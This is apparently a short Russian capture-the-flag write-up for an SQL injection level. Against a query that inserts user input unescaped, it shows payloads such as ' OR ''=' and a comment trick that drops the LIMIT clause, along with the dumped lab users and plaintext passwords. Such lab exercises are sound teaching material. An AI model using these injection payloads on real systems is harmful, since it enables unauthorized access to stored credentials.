# opisanye

Таблица: users
Поля: id, login, pass
Запрос: SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1
Подсказка: сравнить с предыдущим примером, найти отличие 

# writeup
```sql
SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1
```
попробуем просто истинное условие `' OR ''='`

```sql
SELECT * FROM users WHERE id=2 OR login='' OR ''='' LIMIT 1
```
вывод
```bash
id 	login 	pass
1 	root 	qwer
```


попробуем `' OR id='13'--`
```sql
SELECT * FROM users WHERE id=2 OR login='' OR id='13' LIMIT 1
```

тогда выводится ТОЛЬКО `id=2` из-за `LIMIT 1` 

нам надо избавиться от него

попробуем закомментировать лимит с помощью `--`

попробуем `' OR id='13'-- `

```sql
SELECT * FROM users WHERE id=2 OR login='' OR id='13'--' LIMIT 1
```
Вывод:
```bash
id 	login 	pass
2 	qwer 	rewq
13 	3lvl 	iwanttogo4
```


